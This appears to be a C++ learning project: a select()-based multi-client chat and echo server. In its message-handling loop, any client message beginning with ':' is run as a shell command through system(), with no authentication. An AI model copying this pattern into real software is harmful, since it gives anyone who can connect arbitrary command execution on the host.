#include "header.hpp"

/*
    The macros operate for fd_set type as follows:

    FD_ZERO(fd_set *set) -- clears a file descriptor set
    FD_SET(int fd, fd_set *set) -- adds fd to the set
    FD_CLR(int fd, fd_set *set) -- removes fd from the set
    FD_ISSET(int fd, fd_set *set) -- tests to see if fd is in the se
*/

int sendall(int s, char *buf, int *len)
{
    int total = 0;        // how many bytes we've sent
    int bytesleft = *len; // how many we have left to send
    int n;

    while(total < *len) {
        n = send(s, buf+total, bytesleft, 0);
        if (n == -1) { break; }
        total += n;
        bytesleft -= n;
    }

    *len = total; // return number actually sent here

    return (n==-1) ? -1 : 0 ; // return -1 on failure, 0 on success
}

void multyClient() {
    sockaddr_in client;
    socklen_t clientSize;
    int clientSocket;

    fd_set master;      // Master file descriptor list
    fd_set copy;
    FD_ZERO(&master);   // Clear the master set
    FD_ZERO(&copy);   // Clear the master set
    FD_SET(listening, &master); // Add the listening socket to the master set

    char host[NI_MAXHOST];
    char svc[NI_MAXSERV];

    int maxFd = listening; // Track the maximum file descriptor

    char buf[4096];

    int bytesRecv;

    for (;;) {
        copy = master; // Copy the master set

        select_restart:
        if ((select(maxFd + 1, &copy, NULL, NULL, NULL)) == -1) {
            if (errno == EINTR) {
               // some signal just interrupted us, so restart
                goto select_restart;
            }
            perror("select");
        }

        for (int i = 0; i <= maxFd; ++i) {
            if (FD_ISSET(i, &copy)) { // Check if the file descriptor is in the set
                if (i == listening) { // New connection
                    // Accept a call
                    clientSize = sizeof(client);

                    if ((clientSocket = accept(listening, reinterpret_cast<sockaddr*>(&client), &clientSize)) == -1) {
                        std::cerr << "Problem with client connection" << std::endl;
                        continue;
                    }

                    FD_SET(clientSocket, &master); // Add the new client socket to the master set
                    if (clientSocket > maxFd) {
                        maxFd = clientSocket; // Update the maximum file descriptor
                    }

                    // Print client information
                    memset(host, 0, NI_MAXHOST);
                    memset(svc, 0, NI_MAXSERV);

                    if (getnameinfo(reinterpret_cast<sockaddr*>(&client), clientSize, host, NI_MAXHOST, svc, NI_MAXSERV, 0)) {
                        std::cout << host << " connected on " << svc << std::endl;
                    } else {
                        inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
                        std::cout << host << " connected on " << ntohs(client.sin_port) << std::endl;
                    }
                }
                else { // Existing client activity
                    memset(buf, 0, 4096);

                    // Receive data from the client
                    if ((bytesRecv = recv(i, buf, sizeof(buf), 0)) <= 0) {
                        // Error or connection closed
                        if (bytesRecv == 0) {
                            std::cout << "Client " << i << " disconnected" << std::endl;
                        }
                        else {
                            std::cerr << "Recv error on client " << i << std::endl;
                        }

                        close(i); // Close the socket
                        FD_CLR(i, &master); // Remove the socket from the master set
                    }
                    else {
                        // Check if all bytes were received
                        int len = strlen(buf);

                        if (sendall(i, buf, &len) == -1) {
                            perror("sendall");
                            std::cerr << "We only sent " << len << " bytes because of the error!" << std::endl;
                            continue;
                        }

                        std::string receivedData(buf, bytesRecv);
                        receivedData.erase(receivedData.find_last_not_of(" \n\r\t") + 1);
                        receivedData.erase(0, receivedData.find_first_not_of(" \n\r\t"));
                        if (receivedData == "exit" || receivedData == "quit" || receivedData == "bye") {
                            std::cout << "Client " << i << " requested disconnection" << std::endl;
                            close(i); // Close the client's socket
                            FD_CLR(i, &master);
                        }
                        else if (std::string(receivedData, 0, 1) == ":") {
                            std::string command = std::string(receivedData).substr(1);
                            system(command.c_str());
                        }
                        else {
                            for(int j = 0; j <= maxFd; j++) {
                            // send to everyone!
                                if (FD_ISSET(j, &master)) {
                                    // except the listener and ourselvesç
                                    if (j != listening && j != i) {
                                        if (send(j, buf, bytesRecv, 0) == -1) {
                                            perror("send");
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    for (int i = 0; i <= maxFd; ++i) {
        if (FD_ISSET(i, &master)) {
            close(i);
        }
    }

    // Close listening socket
    close(listening);
}
